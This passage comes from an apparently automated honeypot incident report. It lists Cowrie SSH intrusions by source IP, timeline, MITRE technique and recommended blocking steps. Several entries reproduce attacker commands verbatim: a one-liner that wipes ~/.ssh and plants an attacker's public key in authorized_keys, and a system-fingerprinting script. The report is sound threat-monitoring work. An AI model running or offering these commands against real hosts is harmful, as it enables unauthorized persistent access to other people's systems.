| `2026-08-29 17:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.212.154[.]161` to AbuseIPDB if not already reported
- [ ] Block `49.212.154[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f80ccc44703b

| Field | Detail |
|---|---|
| **Source IP** | `49.212.154[.]161` |
| **First Seen** | 2026-08-29 17:59 |
| **Last Seen** | 2026-08-29 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:59:38` | `cowrie.session.connect` |
| `2026-08-29 17:59:38` | `cowrie.client.version` |
| `2026-08-29 17:59:38` | `cowrie.client.kex` |
| `2026-08-29 17:59:39` | `cowrie.login.success` |
| `2026-08-29 17:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.212.154[.]161` to AbuseIPDB if not already reported
- [ ] Block `49.212.154[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fc3bee4e865

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-08-29 18:02 |
| **Last Seen** | 2026-08-29 18:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:02:24` | `cowrie.session.connect` |
| `2026-08-29 18:02:24` | `cowrie.client.version` |
| `2026-08-29 18:02:24` | `cowrie.client.kex` |
| `2026-08-29 18:02:25` | `cowrie.login.success` |
| `2026-08-29 18:02:26` | `cowrie.session.params` |
| `2026-08-29 18:02:26` | `cowrie.command.input` |
| `2026-08-29 18:02:26` | `cowrie.command.failed` |
| `2026-08-29 18:02:27` | `cowrie.log.closed` |
| `2026-08-29 18:02:28` | `cowrie.session.params` |
| `2026-08-29 18:02:28` | `cowrie.command.input` |
| `2026-08-29 18:02:28` | `cowrie.session.file_download` |
| `2026-08-29 18:02:28` | `cowrie.log.closed` |
| `2026-08-29 18:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba5fade7f619

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-08-29 18:02 |
| **Last Seen** | 2026-08-29 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:02:28` | `cowrie.session.connect` |
| `2026-08-29 18:02:28` | `cowrie.client.version` |
| `2026-08-29 18:02:29` | `cowrie.client.kex` |
| `2026-08-29 18:02:30` | `cowrie.login.success` |
| `2026-08-29 18:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-553f47e5a13b

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-08-29 18:02 |
| **Last Seen** | 2026-08-29 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:02:31` | `cowrie.session.connect` |
| `2026-08-29 18:02:31` | `cowrie.client.version` |
| `2026-08-29 18:02:32` | `cowrie.client.kex` |
| `2026-08-29 18:02:33` | `cowrie.login.success` |
| `2026-08-29 18:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d917b41f3bbc

| Field | Detail |
|---|---|
| **Source IP** | `61.155.106[.]101` |
| **First Seen** | 2026-08-29 18:02 |
| **Last Seen** | 2026-08-29 18:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:02:47` | `cowrie.session.connect` |
| `2026-08-29 18:02:47` | `cowrie.client.version` |
| `2026-08-29 18:02:48` | `cowrie.client.kex` |
| `2026-08-29 18:02:49` | `cowrie.login.success` |
| `2026-08-29 18:02:49` | `cowrie.session.params` |
| `2026-08-29 18:02:49` | `cowrie.command.input` |
| `2026-08-29 18:02:49` | `cowrie.command.failed` |
| `2026-08-29 18:02:50` | `cowrie.log.closed` |
| `2026-08-29 18:02:51` | `cowrie.session.params` |
| `2026-08-29 18:02:51` | `cowrie.command.input` |
| `2026-08-29 18:02:52` | `cowrie.session.file_download` |
| `2026-08-29 18:02:52` | `cowrie.log.closed` |
| `2026-08-29 18:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.155.106[.]101` to AbuseIPDB if not already reported
- [ ] Block `61.155.106[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab209c36a1d

| Field | Detail |
|---|---|
| **Source IP** | `61.155.106[.]101` |
| **First Seen** | 2026-08-29 18:02 |
| **Last Seen** | 2026-08-29 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:02:52` | `cowrie.session.connect` |
| `2026-08-29 18:02:52` | `cowrie.client.version` |
| `2026-08-29 18:02:52` | `cowrie.client.kex` |
| `2026-08-29 18:02:53` | `cowrie.login.success` |
| `2026-08-29 18:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.155.106[.]101` to AbuseIPDB if not already reported
- [ ] Block `61.155.106[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c060365006

| Field | Detail |
|---|---|
| **Source IP** | `61.155.106[.]101` |
| **First Seen** | 2026-08-29 18:02 |
| **Last Seen** | 2026-08-29 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:02:53` | `cowrie.session.connect` |
| `2026-08-29 18:02:53` | `cowrie.client.version` |
| `2026-08-29 18:02:54` | `cowrie.client.kex` |
| `2026-08-29 18:02:55` | `cowrie.login.success` |
| `2026-08-29 18:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.155.106[.]101` to AbuseIPDB if not already reported
- [ ] Block `61.155.106[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e7eb4f5b6e1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 18:08 |
| **Last Seen** | 2026-08-29 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:08:29` | `cowrie.session.connect` |
| `2026-08-29 18:08:29` | `cowrie.client.version` |
| `2026-08-29 18:08:29` | `cowrie.client.kex` |
| `2026-08-29 18:08:30` | `cowrie.login.success` |
| `2026-08-29 18:08:30` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:08:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 18:08:30` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:08:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1422204920d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 18:09 |
| **Last Seen** | 2026-08-29 18:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:09:31` | `cowrie.session.connect` |
| `2026-08-29 18:09:31` | `cowrie.client.version` |
| `2026-08-29 18:09:31` | `cowrie.client.kex` |
| `2026-08-29 18:09:32` | `cowrie.login.success` |
| `2026-08-29 18:09:32` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:09:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 18:09:33` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26465e6db1a5

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-29 18:13 |
| **Last Seen** | 2026-08-29 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:13:29` | `cowrie.session.connect` |
| `2026-08-29 18:13:29` | `cowrie.client.version` |
| `2026-08-29 18:13:30` | `cowrie.client.kex` |
| `2026-08-29 18:13:30` | `cowrie.login.success` |
| `2026-08-29 18:13:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d0c58eb637a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-29 18:13 |
| **Last Seen** | 2026-08-29 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:13:30` | `cowrie.session.connect` |
| `2026-08-29 18:13:30` | `cowrie.client.version` |
| `2026-08-29 18:13:30` | `cowrie.client.kex` |
| `2026-08-29 18:13:30` | `cowrie.login.success` |
| `2026-08-29 18:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4da859e047f9

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-29 18:13 |
| **Last Seen** | 2026-08-29 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:13:38` | `cowrie.session.connect` |
| `2026-08-29 18:13:38` | `cowrie.client.version` |
| `2026-08-29 18:13:38` | `cowrie.client.kex` |
| `2026-08-29 18:13:39` | `cowrie.login.success` |
| `2026-08-29 18:13:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b791a7eb6e37

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-29 18:13 |
| **Last Seen** | 2026-08-29 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:13:39` | `cowrie.session.connect` |
| `2026-08-29 18:13:39` | `cowrie.client.version` |
| `2026-08-29 18:13:39` | `cowrie.client.kex` |
| `2026-08-29 18:13:40` | `cowrie.login.success` |
| `2026-08-29 18:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7e0f67f86f6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 18:16 |
| **Last Seen** | 2026-08-29 18:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:16:46` | `cowrie.session.connect` |
| `2026-08-29 18:16:46` | `cowrie.client.version` |
| `2026-08-29 18:16:46` | `cowrie.client.kex` |
| `2026-08-29 18:16:49` | `cowrie.login.success` |
| `2026-08-29 18:16:52` | `cowrie.session.params` |
| `2026-08-29 18:16:52` | `cowrie.command.input` |
| `2026-08-29 18:16:52` | `cowrie.command.input` |
| `2026-08-29 18:16:52` | `cowrie.command.input` |
| `2026-08-29 18:16:52` | `cowrie.command.input` |
| `2026-08-29 18:16:52` | `cowrie.command.input` |
| `2026-08-29 18:16:52` | `cowrie.command.success` |
| `2026-08-29 18:16:52` | `cowrie.command.input` |
| `2026-08-29 18:16:52` | `cowrie.command.input` |
| `2026-08-29 18:16:52` | `cowrie.command.input` |
| `2026-08-29 18:16:52` | `cowrie.command.input` |
| `2026-08-29 18:16:52` | `cowrie.log.closed` |
| `2026-08-29 18:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-518631497423

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-08-29 18:18 |
| **Last Seen** | 2026-08-29 18:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:18:36` | `cowrie.session.connect` |
| `2026-08-29 18:18:37` | `cowrie.client.version` |
| `2026-08-29 18:18:37` | `cowrie.client.kex` |
| `2026-08-29 18:18:37` | `cowrie.login.success` |
| `2026-08-29 18:18:38` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2e80f72d544

| Field | Detail |
|---|---|
| **Source IP** | `216.232.226[.]217` |
| **First Seen** | 2026-08-29 18:18 |
| **Last Seen** | 2026-08-29 18:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:18:47` | `cowrie.session.connect` |
| `2026-08-29 18:18:48` | `cowrie.client.version` |
| `2026-08-29 18:18:48` | `cowrie.client.kex` |
| `2026-08-29 18:18:49` | `cowrie.login.success` |
| `2026-08-29 18:18:49` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:18:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.232.226[.]217` to AbuseIPDB if not already reported
- [ ] Block `216.232.226[.]217` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-306d2dfb8c5b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 18:18 |
| **Last Seen** | 2026-08-29 18:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:18:57` | `cowrie.session.connect` |
| `2026-08-29 18:18:58` | `cowrie.client.version` |
| `2026-08-29 18:18:58` | `cowrie.client.kex` |
| `2026-08-29 18:19:01` | `cowrie.login.success` |
| `2026-08-29 18:19:04` | `cowrie.session.params` |
| `2026-08-29 18:19:04` | `cowrie.command.input` |
| `2026-08-29 18:19:04` | `cowrie.command.input` |
| `2026-08-29 18:19:04` | `cowrie.command.input` |
| `2026-08-29 18:19:04` | `cowrie.command.input` |
| `2026-08-29 18:19:04` | `cowrie.command.input` |
| `2026-08-29 18:19:04` | `cowrie.command.success` |
| `2026-08-29 18:19:04` | `cowrie.command.input` |
| `2026-08-29 18:19:04` | `cowrie.command.input` |
| `2026-08-29 18:19:04` | `cowrie.command.input` |
| `2026-08-29 18:19:04` | `cowrie.command.input` |
| `2026-08-29 18:19:05` | `cowrie.log.closed` |
| `2026-08-29 18:19:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59499b6cac81

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 18:18 |
| **Last Seen** | 2026-08-29 18:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:18:58` | `cowrie.session.connect` |
| `2026-08-29 18:18:58` | `cowrie.client.version` |
| `2026-08-29 18:18:58` | `cowrie.client.kex` |
| `2026-08-29 18:19:00` | `cowrie.login.success` |
| `2026-08-29 18:19:00` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:19:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 18:19:00` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d74447e1acfd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 18:21 |
| **Last Seen** | 2026-08-29 18:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:21:13` | `cowrie.session.connect` |
| `2026-08-29 18:21:13` | `cowrie.client.version` |
| `2026-08-29 18:21:13` | `cowrie.client.kex` |
| `2026-08-29 18:21:17` | `cowrie.login.success` |
| `2026-08-29 18:21:20` | `cowrie.session.params` |
| `2026-08-29 18:21:20` | `cowrie.command.input` |
| `2026-08-29 18:21:20` | `cowrie.command.input` |
| `2026-08-29 18:21:20` | `cowrie.command.input` |
| `2026-08-29 18:21:20` | `cowrie.command.input` |
| `2026-08-29 18:21:20` | `cowrie.command.input` |
| `2026-08-29 18:21:20` | `cowrie.command.success` |
| `2026-08-29 18:21:20` | `cowrie.command.input` |
| `2026-08-29 18:21:20` | `cowrie.command.input` |
| `2026-08-29 18:21:20` | `cowrie.command.input` |
| `2026-08-29 18:21:20` | `cowrie.command.input` |
| `2026-08-29 18:21:21` | `cowrie.log.closed` |
| `2026-08-29 18:21:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-640c28e9e4ef

| Field | Detail |
|---|---|
| **Source IP** | `187.218.57[.]50` |
| **First Seen** | 2026-08-29 18:21 |
| **Last Seen** | 2026-08-29 18:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:21:13` | `cowrie.session.connect` |
| `2026-08-29 18:21:13` | `cowrie.client.version` |
| `2026-08-29 18:21:13` | `cowrie.client.kex` |
| `2026-08-29 18:21:15` | `cowrie.login.success` |
| `2026-08-29 18:21:15` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.218.57[.]50` to AbuseIPDB if not already reported
- [ ] Block `187.218.57[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ddb85421080

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 18:21 |
| **Last Seen** | 2026-08-29 18:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:21:16` | `cowrie.session.connect` |
| `2026-08-29 18:21:16` | `cowrie.client.version` |
| `2026-08-29 18:21:16` | `cowrie.client.kex` |
| `2026-08-29 18:21:17` | `cowrie.login.success` |
| `2026-08-29 18:21:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:21:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 18:21:17` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03483d082fc

| Field | Detail |
|---|---|
| **Source IP** | `218.15.224[.]102` |
| **First Seen** | 2026-08-29 18:21 |
